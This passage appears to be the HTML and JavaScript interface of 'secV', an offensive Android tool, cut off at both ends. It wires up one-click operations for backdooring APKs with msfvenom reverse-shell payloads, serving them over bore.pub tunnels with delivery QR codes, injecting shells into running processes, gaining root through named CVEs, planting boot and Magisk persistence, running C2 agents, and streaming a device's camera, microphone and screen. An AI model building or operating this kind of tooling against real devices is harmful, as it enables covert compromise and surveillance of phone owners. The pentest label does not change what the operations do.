#msf-status{font-size:0.58rem;letter-spacing:0.1em;color:var(--muted);}
#msf-status.on{color:var(--green);}
</style>
</head>
<body>

<!-- TOP BAR -->
<div id="topbar">
  <div class="logo">secV<span class="logo-sep">/</span><span class="logo-sub">android pentest</span></div>
  <div class="devbadge" id="devbadge">
    <div id="dev-dot"></div>
    <div id="dev-name">no device</div>
    <div id="dev-os"></div>
  </div>
  <span id="lhost-display"></span>
  <span id="dev-count" style="font-size:0.58rem;color:var(--muted);letter-spacing:0.1em;"></span>
  <button class="tb-btn" onclick="refreshDevices()" title="Poll for devices">⟳ refresh</button>
  <button class="tb-btn" id="reload-btn" onclick="forceReloadADB()" title="Kill + restart ADB server">⚡ reload adb</button>
  <button class="tb-btn" onclick="clearTerminal()">⌧ clear</button>
  <button class="tb-btn" onclick="switchTab('setup')">⚙ setup</button>
  <button class="tb-btn" id="kill-btn" onclick="killOp()">✕ kill</button>
</div>

<!-- SESSIONS BAR -->
<div id="sessions-bar">
  <span id="sess-label">Sessions</span>
  <span id="sess-count"></span>
</div>

<!-- MAIN -->
<div id="main">
  <!-- SIDEBAR -->
  <div id="sidebar">
    <div id="dev-selector">
      <select id="dev-select" onchange="onDeviceChange()">
        <option value="">-- device --</option>
      </select>
      <button onclick="loadAppList()">↓ load apps</button>
    </div>
    <div id="op-groups"></div>
  </div>

  <!-- RIGHT -->
  <div id="right">
    <!-- PARAMS -->
    <div id="params-panel">
      <div class="op-title" id="op-title">Select an operation</div>
      <div class="op-desc" id="op-desc">Click any operation in the sidebar to configure and run it.</div>
      <div id="params-form"></div>
      <!-- PROCESS SNIFFER PANEL (shown only for process_inject) -->
      <div id="proc-sniff-panel">
        <div class="ps-toolbar">
          <span style="font-family:var(--mono);font-size:0.64rem;color:var(--muted);letter-spacing:0.06em;white-space:nowrap;">LIVE PROCESSES</span>
          <input id="ps-filter" class="ps-filter" type="text" placeholder="filter by name or PID…" oninput="onPsFilter()">
          <button class="ps-btn" id="ps-toggle-btn" onclick="toggleProcStream()">▶ stream</button>
          <button class="ps-btn" onclick="refreshProcs()">↺ refresh</button>
          <span class="ps-count" id="ps-count">0 procs</span>
        </div>
        <table id="proc-table">
          <thead><tr>
            <th>PID</th><th>PPID</th><th>USER</th><th>S</th><th>PROCESS NAME</th>
          </tr></thead>
          <tbody id="proc-tbody"></tbody>
        </table>
      </div>
    </div>

    <!-- TABS -->
    <div id="tabs">
      <div class="tab active" onclick="switchTab('terminal')">Terminal</div>
      <div class="tab" onclick="switchTab('adb')">ADB Console</div>
      <div class="tab" onclick="switchTab('findings')">Findings <span id="findings-badge" class="badge" style="display:none">0</span></div>
      <div class="tab" onclick="switchTab('qr')">QR Codes <span id="qr-badge" class="badge" style="display:none">0</span></div>
      <div class="tab" onclick="switchTab('files')">Files</div>
      <div class="tab" onclick="switchTab('setup')">Setup/Deps</div>
      <div class="tab" id="c2-tab" onclick="switchTab('c2')">C2 Dashboard</div>
      <div class="tab" id="live-tab" onclick="switchTab('live')">Live Media <span id="live-badge" class="badge" style="display:none">●</span></div>
    </div>

    <!-- TERMINAL TAB -->
    <div id="terminal-wrap"><div id="terminal"></div></div>
    <!-- ADB CONSOLE TAB -->
    <div id="adb-console">
      <div id="adb-output"></div>
      <div id="adb-input-row">
        <span>adb&gt;&nbsp;</span>
        <input id="adb-input" type="text" placeholder="shell getprop ro.product.model" onkeydown="adbEnter(event)">
      </div>
    </div>
    <!-- FINDINGS TAB -->
    <div id="findings-panel"></div>
    <!-- QR TAB -->
    <div id="qr-panel"></div>
    <!-- FILES TAB -->
    <div id="files-panel"></div>
    <!-- SETUP TAB -->
    <div id="setup-panel">
      <div style="color:var(--muted);font-size:0.68rem;margin-bottom:8px;letter-spacing:0.02em;">Global defaults applied to all operations. Dependency status auto-detected.</div>
      <div style="color:var(--grey);font-size:0.58rem;margin-bottom:6px;letter-spacing:0.18em;text-transform:uppercase;">Global Settings</div>
      <div class="settings-grid">
        <div class="field"><label>LHOST (attacker IP)</label><input id="s-lhost" type="text" placeholder="auto-detect"></div>
        <div class="field"><label>LPORT</label><input id="s-lport" type="text" value="4444"></div>
        <div class="field"><label>Bore server</label><input id="s-bore" type="text" value="bore.pub"></div>
        <div class="field"><label>NVD API key</label><input id="s-nvd" type="text" placeholder="optional"></div>
        <div class="field"><label>C2 host</label><input id="s-c2host" type="text" placeholder="auto-detect"></div>
        <div class="field"><label>C2 port</label><input id="s-c2port" type="text" value="8889"></div>
      </div>
      <button id="save-settings" onclick="saveSettings()">💾 Save settings</button>
      <button class="tb-btn" style="margin-left:8px;margin-top:8px;" onclick="detectLhost()">⟳ Auto-detect LHOST</button>
      <div style="color:var(--grey);font-size:0.58rem;margin:12px 0 6px;letter-spacing:0.18em;text-transform:uppercase;">Dependencies</div>
      <div id="dep-grid" class="dep-grid">
        <div style="color:var(--muted);font-size:0.68rem;padding:12px 14px;">Loading...</div>
      </div>
    </div>
    <!-- LIVE MEDIA PANEL -->
    <div id="live-panel">
      <!-- Screen Mirror -->
      <div class="live-section">
        <div class="live-section-hdr">
          <div class="live-dot" id="screen-dot"></div>
          <div class="live-label">Screen Mirror</div>
          <button class="live-btn go" onclick="startScreen()">▶ Start</button>
          <button class="live-btn active" onclick="stopScreen()" style="display:none" id="screen-stop-btn">■ Stop</button>
          <button class="live-btn" onclick="snapScreen()">⬡ Snap</button>
          <span id="screen-fps" style="font-size:0.58rem;color:var(--muted);margin-left:4px;letter-spacing:0.06em;"></span>
        </div>
        <div id="screen-wrap">
          <div id="screen-placeholder">Screen mirror off — click Start to begin streaming</div>
          <img id="screen-img" alt="screen" />
          <div id="screen-overlay">● LIVE</div>
        </div>
      </div>

      <!-- Camera + Audio -->
      <div class="live-grid">
        <!-- Camera -->
        <div class="live-section">
          <div class="live-section-hdr">
            <div class="live-dot" id="cam-dot"></div>
            <div class="live-label">Camera</div>
            <select class="live-select" id="cam-id">
              <option value="0">Camera 0 (back)</option>
              <option value="1">Camera 1 (front)</option>
            </select>
            <button class="live-btn" onclick="camSnap()">⬡ Snap</button>
            <button class="live-btn go" onclick="startCamStream()">▶ Stream</button>
            <input class="live-input" id="cam-port" type="text" value="8880" placeholder="MSF port" style="width:56px;">
          </div>
          <div class="camera-wrap">
            <div id="camera-placeholder">Camera off — use Meterpreter webcam_stream or Snap</div>
            <img id="camera-img" alt="camera" />
          </div>
        </div>

        <!-- Audio -->
        <div class="live-section">
          <div class="live-section-hdr">
            <div class="live-dot" id="audio-dot"></div>
            <div class="live-label">Audio</div>
          </div>
          <!-- Microphone -->
          <div class="audio-row">
            <span class="audio-label">Mic</span>
            <div id="mic-visualizer"></div>
            <button class="live-btn" id="mic-btn" onclick="toggleMic()">▶ Record</button>
            <select class="live-select" id="mic-dur">
              <option value="3">3s</option>
              <option value="5" selected>5s</option>
              <option value="10">10s</option>
            </select>
          </div>
          <div style="padding:4px 14px 8px;">
            <audio id="mic-audio" controls style="width:100%;height:28px;display:none;"></audio>
            <div id="mic-status" style="font-size:0.6rem;color:var(--muted);letter-spacing:0.06em;margin-top:4px;">Idle</div>
          </div>
          <!-- Speaker -->
          <div class="audio-row">
            <span class="audio-label">Speaker</span>
            <label class="speaker-file" id="spk-label" for="spk-file">Choose audio file…</label>
            <input type="file" id="spk-file" accept="audio/*" style="display:none" onchange="speakerFileChosen(this)">
            <button class="live-btn go" onclick="pushSpeaker()">▶ Push</button>
          </div>
          <div style="padding:4px 14px 8px;">
            <div id="spk-status" style="font-size:0.6rem;color:var(--muted);letter-spacing:0.06em;">No file selected</div>
          </div>
        </div>
      </div>

      <!-- MSF Meterpreter Console -->
      <div class="live-section">
        <div class="live-section-hdr">
          <div class="live-dot" id="msf-dot"></div>
          <div class="live-label">Meterpreter Console</div>
          <span id="msf-status">offline</span>
          <button class="live-btn go" onclick="startMsf()">▶ Start MSF</button>
          <button class="live-btn active" onclick="stopMsf()">■ Stop</button>
          <button class="live-btn" onclick="msfSend('sessions -l')">sessions</button>
          <button class="live-btn" onclick="msfSend('help')">help</button>
        </div>
        <div id="msf-terminal"></div>
        <div id="msf-input-row">
          <span>msf&gt;&nbsp;</span>
          <input id="msf-input" type="text" placeholder="sessions -i 1; screenshot; webcam_stream -l 0.0.0.0 -p 8880"
                 onkeydown="msfEnter(event)">
        </div>
      </div>
    </div>
    <!-- C2 PANEL -->
    <div id="c2-panel">
      <div id="c2-toolbar">
        <span>port:</span>
        <input id="c2-port-inp" type="text" value="8891">
        <button class="c2-btn launch" onclick="launchC2()">▶ Launch C2</button>
        <button class="c2-btn stop" onclick="stopC2()">✕ Stop</button>
        <span id="c2-status-badge" style="font-size:0.6rem;color:var(--muted);margin-left:6px;letter-spacing:0.06em;"></span>
        <a id="c2-open-link" href="#" target="_blank" style="font-size:0.65rem;letter-spacing:0.06em;display:none;margin-left:4px;">↗ open</a>
      </div>
      <div id="c2-frame-wrap">
        <div id="c2-placeholder">
          <div class="c2-icon">C2</div>
          <div class="c2-title">secV C2 Dashboard</div>
          <div class="c2-hint">Click <b style="color:var(--white)">▶ Launch C2</b> to start.</div>
          <div style="font-size:0.6rem;color:var(--muted);letter-spacing:0.08em;text-transform:uppercase;">Sessions · Bore · MSF · QR · Agent Callbacks · Encrypted Logs</div>
        </div>
        <iframe id="c2-iframe" style="display:none;width:100%;height:100%;border:none;" src="" allow="same-origin"></iframe>
      </div>
    </div>
  </div>
</div>

<!-- STATUS BAR -->
<div id="statusbar">
  <div id="status-dot"></div>
  <div id="status-text">idle</div>
  <div id="status-time"></div>
  <div id="workdir-link" onclick="switchTab('files');loadFiles()">~/.secv/android/</div>
  <div id="progress-bar"></div>
</div>

<!-- TOAST CONTAINER -->
<div id="toast-container"></div>

<script>
// ── Operation definitions ─────────────────────────────────────────────────────
const OPS = {
  "Recon & Analysis": [
    {id:"recon", label:"recon", desc:"Device fingerprinting: model, Android ver, root, SELinux, bootloader, chipset, patch level",
     fields:[]},
    {id:"app_scan", label:"app scan", desc:"Full APK analysis: manifest, permissions, components, secrets, security score",
     fields:[
       {n:"package",p:"",t:"text",label:"Package (blank=all)"},
       {n:"deep_analysis",p:"false",t:"select",opts:["false","true"],label:"Deep (jadx)"},
       {n:"search_secrets",p:"true",t:"select",opts:["true","false"],label:"Search secrets"},
       {n:"scan_limit",p:"5",t:"text",label:"App limit"},
       {n:"bypass_ssl",p:"false",t:"select",opts:["false","true"],label:"SSL bypass patch"},
     ]},
    {id:"vuln_scan", label:"vuln scan", desc:"Device+app CVE assessment (2019-2026, MediaTek, NVD live lookups)",
     fields:[
       {n:"package",p:"",t:"text",label:"Package (blank=all)"},
       {n:"nvd_api_key",p:"",t:"text",label:"NVD API key (opt)"},
     ]},
    {id:"exploit", label:"exploit", desc:"Intent injection, SQL injection on content providers, path traversal, exported components",
     fields:[{n:"package",p:"com.target.app",t:"text",label:"Package (required)"}]},
    {id:"network", label:"network", desc:"Packet capture (tcpdump via root) + logcat credential leakage analysis",
     fields:[{n:"package",p:"",t:"text",label:"Package (opt)"}]},
    {id:"forensics", label:"forensics", desc:"DB/SharedPrefs extraction (root), logcat, ADB backup, SQLite inspection",
     fields:[
       {n:"package",p:"com.target.app",t:"text",label:"Package (required)"},
       {n:"backup",p:"false",t:"select",opts:["false","true"],label:"ADB backup"},
     ]},
    {id:"device_net_scan", label:"device net scan", desc:"Scan device WiFi subnet via netrecon — detect open ADB TCP, web services",
     fields:[]},
    {id:"full", label:"full scan", desc:"All of: recon + app_scan + vuln_scan + exploit + network + forensics",
     fields:[
       {n:"package",p:"",t:"text",label:"Package (blank=all)"},
       {n:"deep_analysis",p:"false",t:"select",opts:["false","true"],label:"Deep (jadx)"},
       {n:"search_secrets",p:"true",t:"select",opts:["true","false"],label:"Search secrets"},
     ]},
  ],
  "Access & Escalation": [
    {id:"adb_wifi", label:"adb wifi", desc:"Enable ADB over TCP/WiFi (adb tcpip 5555) — drop USB dependency",
     fields:[{n:"adb_port",p:"5555",t:"text",label:"ADB TCP port"}]},
    {id:"get_root", label:"get root", desc:"Multi-vector root: Magisk su → adb root → CVE-2024-0044 → mtk-su → KernelSU",
     fields:[]},
    {id:"exploit_cve", label:"exploit CVE", desc:"Targeted CVE exploitation. Supported: CVE-2024-0044, CVE-2023-45866, CVE-2024-31317",
     fields:[
       {n:"cve",p:"CVE-2024-0044",t:"select",
        opts:["CVE-2024-0044","CVE-2023-45866","CVE-2024-31317"],label:"CVE ID"},
     ]},
    {id:"cve_chain", label:"CVE chain", desc:"Chain multiple CVEs: bt_to_root, sandbox_exfil, zero_click_full, or custom list",
     fields:[
       {n:"chain",p:"bt_to_root",t:"select",
        opts:["bt_to_root","sandbox_exfil","zero_click_full","custom"],label:"Chain"},
       {n:"chain_custom",p:"",t:"text",label:"Custom chain (comma-sep CVEs)"},
     ]},
    {id:"zero_click", label:"zero click", desc:"Zero-click attack surface: Bluetooth HID, NFC NDEF, WiFi broadcast, media parser",
     fields:[
       {n:"vector",p:"all",t:"select",opts:["all","bt","nfc","wifi","media"],label:"Vector"},
     ]},
  ],
  "Payload & Delivery": [
    {id:"backdoor_apk", label:"backdoor APK",
     desc:"Pull APK → inject msfvenom payload (-x template) → sign → WAN expose (bore/cloudflare) → delivery QR. WAN expose runs automatically unless disabled.",
     runLabel:"INJECT",
     fields:[
       {n:"package",p:"",t:"text",label:"Package (blank = local APK)"},
       {n:"lhost",p:"",t:"text",label:"LHOST (auto-detect)"},
       {n:"lport",p:"4444",t:"text",label:"LPORT"},
       {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload"},
       {n:"install",p:"false",t:"select",opts:["false","true"],label:"Install on device"},
       {n:"wan_expose",p:"true",t:"select",opts:["true","false"],label:"WAN expose (bore/cloudflare)"},
       {n:"serve_port",p:"8888",t:"text",label:"APK serve port"},
       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server"},
     ]},
    {id:"deploy_shell", label:"deploy shell",
     desc:"Generate fresh msfvenom APK → adb install (no root) → WAN expose + delivery QR. Installs directly onto device; WAN expose runs automatically unless disabled.",
     runLabel:"INJECT",
     fields:[
       {n:"lhost",p:"",t:"text",label:"LHOST (auto-detect)"},
       {n:"lport",p:"4444",t:"text",label:"LPORT"},
       {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload"},
       {n:"wan_expose",p:"true",t:"select",opts:["true","false"],label:"WAN expose after deploy"},
       {n:"serve_port",p:"8888",t:"text",label:"APK serve port"},
       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server"},
     ]},
    {id:"rebuild", label:"rebuild APK",
     desc:"Build BootBuddy WAN C2 APK: BootReceiver + DexClassLoader + bore tunnel + QR delivery",
     runLabel:"BUILD",
     fields:[
       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
       {n:"msf",p:"false",t:"select",opts:["false","true"],label:"Merge MSF payload"},
       {n:"msf_lport",p:"4444",t:"text",label:"MSF LPORT"},
       {n:"bore_dex_port",p:"21062",t:"text",label:"bore DEX port"},
       {n:"bore_msf_port",p:"37993",t:"text",label:"bore MSF port"},
       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server"},
     ]},
    {id:"objection_patch", label:"objection patch",
     desc:"Embed Frida gadget into APK via objection (no root needed at runtime) → sign → WAN expose + delivery QR",
     runLabel:"PATCH",
     fields:[
       {n:"package",p:"com.target.app",t:"text",label:"Package"},
       {n:"install",p:"false",t:"select",opts:["false","true"],label:"Install patched APK"},
       {n:"wan_expose",p:"true",t:"select",opts:["true","false"],label:"WAN expose after patch"},
       {n:"serve_port",p:"8888",t:"text",label:"APK serve port"},
       {n:"bore_server",p:"bore.pub",t:"text",label:"bore server"},
     ]},
  ],
  "Instrumentation": [
    {id:"frida_hook", label:"frida hook", desc:"Auto-deploy frida-server, SSL unpin + root bypass + cred dump + trace",
     fields:[
       {n:"package",p:"com.target.app",t:"text",label:"Package (required)"},
       {n:"hook_mode",p:"all",t:"select",opts:["all","ssl_unpin","root_bypass","dump_creds","trace"],label:"Hook mode"},
       {n:"hook_timeout",p:"30",t:"text",label:"Timeout (s)"},
       {n:"trace_method",p:"",t:"text",label:"Trace method (trace mode)"},
     ]},
    {id:"hook", label:"LSPosed hook", desc:"Three-vector persistence hook: Magisk service.sh, SharedUID shell, LSPosed/Zygote",
     fields:[{n:"package",p:"com.target.app",t:"text",label:"Package"}]},
    {id:"unhook", label:"unhook", desc:"Remove all injected hooks planted by the hook operation",
     fields:[]},
    {id:"process_inject", label:"process inject", desc:"Live process sniffer — attach to running APK process and inject reverse shell; optional persistence",
     runLabel:"INJECT",
     fields:[
       {n:"action",p:"inject",t:"select",opts:["sniff","inject","persist_only"],label:"Action"},
       {n:"target_process",p:"",t:"text",label:"PID or package (click row below)"},
       {n:"inject_mode",p:"frida",t:"select",opts:["frida","ptrace"],label:"Inject mode"},
       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
       {n:"lport",p:"4444",t:"text",label:"LPORT"},
       {n:"persist",p:"true",t:"select",opts:["true","false"],label:"Install persistence"},
     ],
     hasProcSniff: true},
  ],
  "Persistence": [
    {id:"persist", label:"persist", desc:"Boot Receiver (no root) + Magisk post-fs-data.d script + Magisk module service.sh",
     fields:[
       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
       {n:"lport",p:"4444",t:"text",label:"LPORT"},
     ]},
  ],
  "C2 & Agent": [
    {id:"inject_agent", label:"inject agent", desc:"Push native ARM64/shell agent, receive JSON recon + TCP C2 callback, auto-escalate",
     fields:[
       {n:"agent_mode",p:"recon",t:"select",opts:["recon","exploit","c2"],label:"Agent mode"},
       {n:"c2_host",p:"",t:"text",label:"C2 host (auto)"},
       {n:"c2_port",p:"8889",t:"text",label:"C2 port"},
       {n:"c2_timeout",p:"20",t:"text",label:"Callback timeout (s)"},
       {n:"escalate",p:"false",t:"select",opts:["false","true"],label:"Auto escalate"},
       {n:"lhost",p:"",t:"text",label:"Shell LHOST (escalate)"},
       {n:"lport",p:"4444",t:"text",label:"Shell LPORT (escalate)"},
     ]},
    {id:"msf_handler", label:"MSF handler", desc:"Generate + launch Metasploit multi/handler + start msfrpcd for RPC",
     fields:[
       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
       {n:"lport",p:"4444",t:"text",label:"LPORT"},
       {n:"payload",p:"tcp",t:"select",opts:["tcp","http","https","shell","stageless"],label:"Payload"},
       {n:"launch",p:"false",t:"select",opts:["false","true"],label:"Launch msfconsole"},
     ]},
    {id:"c2_gui", label:"C2 dashboard (ext)", desc:"Launch secV C2 web dashboard as a separate server (also available as the C2 tab)",
     fields:[{n:"c2_port",p:"8891",t:"text",label:"GUI port"}]},
    {id:"c2_cli", label:"C2 CLI", desc:"Launch C2 server in CLI mode (headless, no browser)",
     fields:[]},
  ],
  "Automated Chains": [
    {id:"full_pwn", label:"full pwn", desc:"recon → adb_wifi → get_root → device_net_scan → deploy_shell → persist → wan_expose",
     fields:[
       {n:"lhost",p:"",t:"text",label:"LHOST (auto)"},
       {n:"lport",p:"4444",t:"text",label:"LPORT"},
     ]},
    {id:"multi_device", label:"multi device", desc:"Run any operation on ALL connected devices simultaneously",
     fields:[
       {n:"sub_operation",p:"recon",t:"select",
        opts:["recon","vuln_scan","full_pwn","inject_agent","app_scan","get_root","persist"],
        label:"Sub-operation"},
     ]},
  ],
};

// ── State ─────────────────────────────────────────────────────────────────────
let currentOp = null;
let appList    = [];
let findings   = [];
let qrList     = [];
let findingsCount = 0;
let qrCount    = 0;
let es             = null;
let opStartTs      = null;
let _activeSessions = {};   // sid → {id,op,device,status,startTs,color}
let _sessionColors = ['#4caf50','#44ddff','#ffcc44','#aa66ff','#4488ff',
                      '#44ff99','#66ddff','#ffdd66','#cc88ff','#66aaff'];
let settings   = {lhost:"",lport:"4444",bore_server:"bore.pub",nvd_api_key:"",c2_host:"",c2_port:"8889"};

// ── Init ──────────────────────────────────────────────────────────────────────
window.onload = () => {
  buildSidebar();
  startDeviceWatch();
  connectSSE();
  loadSettings();
  detectLhost();
  setInterval(updateStatus, 1500);
  setInterval(updateStatusTime, 500);
};

// ── Sidebar ───────────────────────────────────────────────────────────────────
function buildSidebar() {
  const cont = document.getElementById('op-groups');
  cont.innerHTML = '';
  for (const [grp, ops] of Object.entries(OPS)) {
    const g = document.createElement('div');
    g.className = 'op-group';
    const t = document.createElement('div');
    t.className = 'op-group-title';
    t.innerHTML = `<span>${grp}</span><span class="arrow">▾</span>`;
    t.onclick = () => g.classList.toggle('collapsed');
    const l = document.createElement('div'); l.className = 'op-list';
    for (const op of ops) {
      const i = document.createElement('div');
      i.className = 'op-item'; i.textContent = op.label; i.dataset.id = op.id;
      i.onclick = () => selectOp(op, i);
      l.appendChild(i);
    }
    g.append(t, l); cont.appendChild(g);
  }
}

function selectOp(op, el) {
  document.querySelectorAll('.op-item').forEach(e => e.classList.remove('active'));
  el.classList.add('active');
  currentOp = op;
  const panel = document.getElementById('params-panel');
  panel.classList.add('switching');
  setTimeout(() => { renderParams(op); panel.classList.remove('switching'); }, 80);
}

// ── Params ────────────────────────────────────────────────────────────────────
function renderParams(op) {
  document.getElementById('op-title').textContent = op.label;
  document.getElementById('op-desc').textContent = op.desc;
  const form = document.getElementById('params-form');
  form.innerHTML = '';

  // ── device target row (always present for every operation) ─────
  const devWrap = mkField('Target Device');
  const devSel  = document.createElement('select');
  devSel.id    = 'f_device_target';
  devSel.style.cssText = 'min-width:220px;';
  // populate from _deviceMap
  const allOpt = document.createElement('option');
  allOpt.value = '__all__'; allOpt.textContent = '★ All connected devices';
  devSel.appendChild(allOpt);
  const noneOpt = document.createElement('option');
  noneOpt.value = ''; noneOpt.textContent = '-- none (auto) --';
  devSel.appendChild(noneOpt);
  for (const [serial, dev] of Object.entries(_deviceMap)) {
    const o = document.createElement('option');
    o.value = serial;
    o.textContent = (dev.label || serial) + (dev.android ? ' · Android '+dev.android : '');
    devSel.appendChild(o);
  }
  // sync with sidebar selection by default
  const sidebarSel = document.getElementById('dev-select').value;
  devSel.value = sidebarSel || '';
  // keep sidebar in sync when changed here
  devSel.onchange = () => {
    const v = devSel.value;
    if (v !== '__all__') {
      document.getElementById('dev-select').value = v;
      if (v && _deviceMap[v]) _updateDevBadge(_deviceMap[v]);
      else { document.getElementById('devbadge').classList.remove('connected'); }
    }
  };
  devWrap.appendChild(devSel);
  form.appendChild(devWrap);

  for (const f of (op.fields || [])) {
    // use app dropdown if apps loaded and field is 'package'
    if (f.n === 'package' && appList.length > 0) {
      const wrap = mkField(f.label);
      const s = document.createElement('select');
      s.id = 'f_' + f.n; s.name = f.n;
      const blank = document.createElement('option');
      blank.value = ''; blank.textContent = '-- any --'; s.appendChild(blank);
      for (const pkg of appList) {
        const o = document.createElement('option');
        o.value = o.textContent = pkg; s.appendChild(o);
      }
      wrap.appendChild(s); form.appendChild(wrap); continue;
    }
    const wrap = mkField(f.label);
    if (f.t === 'select') {
      const s = document.createElement('select');
      s.id = 'f_' + f.n; s.name = f.n;
      for (const o of f.opts) {
        const opt = document.createElement('option');
        opt.value = o; opt.textContent = o;
        if (o === f.p) opt.selected = true;
        s.appendChild(opt);
      }
      wrap.appendChild(s);
    } else {
      const i = document.createElement('input');
      i.id = 'f_' + f.n; i.name = f.n; i.type = 'text';
      i.dataset.name = f.n; i.className = 'param-field';
      // pre-fill from global settings where applicable
      const settingsMap = {lhost:'lhost',lport:'lport',bore_server:'bore_server',
                           nvd_api_key:'nvd_api_key',c2_host:'c2_host',c2_port:'c2_port'};
      i.value = (f.n in settingsMap && settings[settingsMap[f.n]]) ? settings[settingsMap[f.n]] : (f.p || '');
      i.placeholder = f.p || '';
      wrap.appendChild(i);
    }
    form.appendChild(wrap);
  }

  const btn = document.createElement('button');
  btn.id = 'run-btn';
  btn.textContent = '▶ ' + (op.runLabel || 'RUN');
  btn.onclick = runOp;
  form.appendChild(btn);

  // show process sniffer panel if op has it
  showProcSniff(!!op.hasProcSniff);
  if (op.hasProcSniff) refreshProcs();
}

function mkField(label) {
  const w = document.createElement('div'); w.className = 'field';
  const l = document.createElement('label'); l.textContent = label;
  w.appendChild(l); return w;
}

// ── Run ───────────────────────────────────────────────────────────────────────
function runOp() {
  if (!currentOp) return;

  const devTargetEl = document.getElementById('f_device_target');
  const devTarget   = devTargetEl ? devTargetEl.value : document.getElementById('dev-select').value;
  const allDevices  = devTarget === '__all__';

  const params = { operation: currentOp.id };

  if (allDevices) {
    params.operation     = 'multi_device';
    params.sub_operation = currentOp.id;
    for (const f of (currentOp.fields || [])) {
      const el = document.getElementById('f_' + f.n);
      if (el && el.value.trim()) params[f.n] = el.value.trim();
    }
  } else {
    const serial = devTarget || document.getElementById('dev-select').value;
    if (serial) { params.device = serial; document.getElementById('dev-select').value = serial; }
    if (settings.lhost)       params._lhost_default  = settings.lhost;
    if (settings.bore_server) params._bore_default   = settings.bore_server;
    if (settings.nvd_api_key) params.nvd_api_key     = settings.nvd_api_key;
    for (const f of (currentOp.fields || [])) {
      const el = document.getElementById('f_' + f.n);
      if (el && el.value.trim()) params[f.n] = el.value.trim();
    }
    if (!params.lhost   && settings.lhost)   params.lhost   = settings.lhost;
    if (!params.lport   && settings.lport)   params.lport   = settings.lport;
    if (!params.c2_host && settings.c2_host) params.c2_host = settings.c2_host;
    if (!params.c2_port && settings.c2_port) params.c2_port = settings.c2_port;
    delete params._lhost_default; delete params._bore_default;
  }

  const label   = allDevices
    ? `${currentOp.label} [ALL ${Object.keys(_deviceMap).length} devices]`
    : currentOp.label;
  const context = { target: allDevices ? 'all' : (params.device || 'device'), params };

  switchTab('terminal');
  fetch('/api/run', {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify(context)
  }).then(r => r.json()).then(d => {
    if (d.ok) {
      const sid   = d.session_id;
      const color = _sessionColors[(sid-1) % _sessionColors.length];
      _activeSessions[sid] = {
        id: sid, op: params.operation, device: params.device || '',
        status: 'running', startTs: Date.now(), color
      };
      opStartTs = opStartTs || Date.now();
      updateSessionsBar();
      termLine(`\x1b[36m[*] Session #${sid} started: ${label}\x1b[0m`);
    } else {
      termLine(`\x1b[31m[!] ${d.error}\x1b[0m`);
    }
  });
}

// ── SSE Terminal ──────────────────────────────────────────────────────────────
function connectSSE() {
  if (es) es.close();
  es = new EventSource('/api/stream');
  es.onmessage = (e) => {
    const line = e.data;
    // detect session-done sentinel
    const doneMatch = line.match(/^\x1b\[35m\[done:(\d+)\]\x1b\[0m$/) ||
                      line.match(/^\[done:(\d+)\]$/);
    if (doneMatch) {
      const sid = parseInt(doneMatch[1]);
      if (_activeSessions[sid]) {
        const s = _activeSessions[sid];
        s.status = 'done';
        updateSessionsBar();
        showToast(`Session #${sid} (${s.op}) complete`, 'info', 3000);
        // cleanup done sessions after 8s
        setTimeout(() => { delete _activeSessions[sid]; updateSessionsBar(); }, 8000);
      }
      termLine(line); return;
    }
    termLine(line);
    if (line.includes('[qr-captured]') || line.includes('[qr-url-captured]')) {
      setTimeout(loadQR, 500);
    }
    tryParseFindings(line);
  };
  es.onerror = () => setTimeout(connectSSE, 3000);
}

function termLine(raw) {
  const term = document.getElementById('terminal');
  const span = document.createElement('span'); span.className = 'ln';
  const ts = document.createElement('span'); ts.className = 'ts'; ts.textContent = now();
  span.appendChild(ts);
  span.innerHTML = ts.outerHTML + ansiToHtml(raw);
  term.appendChild(span);
  term.scrollTop = term.scrollHeight;
}
function clearTerminal() { document.getElementById('terminal').innerHTML = ''; }

// ── ANSI ──────────────────────────────────────────────────────────────────────
const ANSI_MAP = {
  '30':'#555','31':'#ff4444','32':'#00ff88','33':'#ffcc44','34':'#4488ff',
  '35':'#aa66ff','36':'#44ddff','37':'#c0c0d8','90':'#505070','91':'#ff6666',
  '92':'#44ff99','93':'#ffdd66','94':'#66aaff','95':'#cc88ff','96':'#66ddff','97':'#ffffff',
};
function ansiToHtml(s) {
  const txt = s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  const parts = txt.split(/(\x1b\[[0-9;]*m)/);
  let result = ''; let open = false;
  for (const p of parts) {
    const m = p.match(/^\x1b\[([0-9;]*)m$/);
    if (m) {
      if (open) { result += '</span>'; open = false; }
      for (const code of m[1].split(';')) {
        const col = ANSI_MAP[code];
        if (col) { result += `<span style="color:${col}">`; open = true; }
      }
    } else { result += p; }
  }
  if (open) result += '</span>';
  return result;
}

// ── Findings ──────────────────────────────────────────────────────────────────
let _jsonBuf = '';
function tryParseFindings(line) {
  _jsonBuf += line;
  try {
    const obj = JSON.parse(_jsonBuf);
    _jsonBuf = '';
    const vulns = obj?.data?.vulnerabilities || obj?.vulnerabilities || [];
    if (vulns.length) {
      findings = findings.concat(vulns);
      findingsCount = findings.length;
      const b = document.getElementById('findings-badge');
      b.textContent = findingsCount; b.style.display = 'inline';
      renderFindings();
    }
  } catch(e) { if (!_jsonBuf.includes('{')) _jsonBuf = ''; }
}

function renderFindings() {
  const panel = document.getElementById('findings-panel');
  panel.innerHTML = '';
  if (!findings.length) {
    panel.innerHTML = '<div style="padding:16px;color:var(--muted);font-size:0.68rem;">No findings yet. Run an operation first.</div>';
    return;
  }
  for (const f of findings) {
    const sev = f.severity || 'INFO';
    const card = document.createElement('div'); card.className = 'finding-card';
    card.innerHTML = `<div class="fh"><span class="sev ${sev}">${sev}</span>
      <b style="font-size:0.75rem;color:var(--white)">${f.id||f.type||'Finding'}</b></div>
      <div class="fdesc">${f.desc||f.description||''}</div>`;
    panel.appendChild(card);
  }
}

// ── QR ────────────────────────────────────────────────────────────────────────
function loadQR() {
  fetch('/api/qr').then(r => r.json()).then(d => {
    qrList = d.qr || [];
    qrCount = qrList.length;
    const b = document.getElementById('qr-badge');
